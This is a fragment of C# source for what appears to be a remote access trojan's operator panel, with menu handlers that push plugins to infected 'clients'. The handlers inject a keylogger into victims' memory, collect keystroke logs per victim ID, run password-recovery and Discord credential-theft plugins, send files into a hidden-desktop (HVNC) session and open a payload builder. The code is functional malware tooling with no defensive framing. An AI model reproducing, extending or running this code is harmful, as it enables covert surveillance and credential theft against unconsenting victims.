        private void ListView1_ColumnClick(object sender, DataGridViewCellEventArgs e)
        {
        }

        private void guna2ImageCheckBox1_CheckedChanged(object sender, EventArgs e)
        {
        }

        private void offlineKeyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "sendMemory";
                msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\Keylogger.exe")));
                msgPack.ForcePathObject("Inject").AsString = "";
                ListViewItem listViewItem = new ListViewItem();
                listViewItem.Text = "Auto Keylogger:";
                listViewItem.SubItems.Add("0");
                listViewItem.ToolTipText = Guid.NewGuid().ToString();
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendMemory.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                if (this.listView44.Items.Count > 0)
                {
                    foreach (object obj in this.listView44.Items)
                    {
                        ListViewItem listViewItem2 = (ListViewItem)obj;
                        if (listViewItem2.Text == listViewItem.Text)
                        {
                            return;
                        }
                    }
                }
                Program.form1.listView44.Items.Add(listViewItem);
                Program.form1.listView44.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void statusStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
        {
        }

        private void toolStripStatusLabel1_Click(object sender, EventArgs e)
        {
        }

        private void ProgramNotificationToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Logger.dll");
                foreach (Clients clients in this.GetSelectedClients())
                {
                    if ((FormKeylogger)Application.OpenForms["keyLogger:" + clients.ID] == null)
                    {
                        FormKeylogger formKeylogger = new FormKeylogger
                        {
                            Name = "keyLogger:" + clients.ID,
                            Text = "keyLogger:" + clients.ID,
                            F = this,
                            FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID, "Keylogger")
                        };
                        formKeylogger.Show();
                        ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "sendMemory";
                msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\Keylogger.exe")));
                msgPack.ForcePathObject("Inject").AsString = "";
                ListViewItem listViewItem = new ListViewItem();
                listViewItem.Text = "Auto Keylogger:";
                listViewItem.SubItems.Add("0");
                listViewItem.ToolTipText = Guid.NewGuid().ToString();
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendMemory.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                if (this.listView44.Items.Count > 0)
                {
                    foreach (object obj in this.listView44.Items)
                    {
                        ListViewItem listViewItem2 = (ListViewItem)obj;
                        if (listViewItem2.Text == listViewItem.Text)
                        {
                            return;
                        }
                    }
                }
                Program.form1.listView44.Items.Add(listViewItem);
                Program.form1.listView44.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            try
            {
                Clients[] selectedClients = this.GetSelectedClients();
                if (selectedClients.Length == 0)
                {
                    Process.Start(Application.StartupPath);
                }
                else
                {
                    foreach (Clients clients in selectedClients)
                    {
                        string text = Path.Combine(Application.StartupPath, "ClientsFolder\\" + clients.ID);
                        if (Directory.Exists(text))
                        {
                            Process.Start(text);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void builderToolStripMenuItem1_Click_1(object sender, EventArgs e)
        {
            FormBuilder formBuilder = new FormBuilder();
            formBuilder.Show();
        }

        private void test5ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            FormBuilder formBuilder = new FormBuilder();
            formBuilder.Show();
        }

        private void passwordRecoveryToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Recovery.dll");
                foreach (Clients @object in this.GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack.Encode2Bytes());
                }
                new HandleLogs().Addmsg("Recovering...", Color.Black);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void coomingSoonToolStripMenuItem_Click(object sender, EventArgs e)
        {
            FrmMain frmMain = new FrmMain(Convert.ToInt32(Properties.Settings.Default.SavedPort) - 1);
            frmMain.Show();
        }

        private void moveToHVNCToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                using (OpenFileDialog openFileDialog = new OpenFileDialog())
                {
                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        MsgPack msgPack = new MsgPack();
                        msgPack.ForcePathObject("Pac_ket").AsString = "sendFile";
                        msgPack.ForcePathObject("Update").AsString = "false";
                        msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
                        msgPack.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
                        MsgPack msgPack2 = new MsgPack();
                        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
                        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                        ListViewItem listViewItem = new ListViewItem();
                        listViewItem.Text = "SendFile: " + Path.GetFileName(openFileDialog.FileName);
                        listViewItem.SubItems.Add("0");
                        listViewItem.ToolTipText = Guid.NewGuid().ToString();
                        if (this.listView44.Items.Count > 0)
                        {
                            foreach (object obj in this.listView44.Items)
                            {
                                ListViewItem listViewItem2 = (ListViewItem)obj;
                                if (listViewItem2.Text == listViewItem.Text)
                                {
                                    return;
                                }
                            }
                        }
                        Program.form1.listView44.Items.Add(listViewItem);
                        Program.form1.listView44.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                        Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void DiscordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Discord.dll");
                foreach (Clients @object in this.GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack.Encode2Bytes());
                }
                new HandleLogs().Addmsg("Recovering Discord...", Color.Black);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {
            throw new NotImplementedException();
        }

        private bool trans;

        public cGeoMain cGeoMain = new cGeoMain();

        public static List<AsyncTask> getTasks = new List<AsyncTask>();

        private ListViewColumnSorter lvwColumnSorter;

        public static bool islogin = false;
    }
}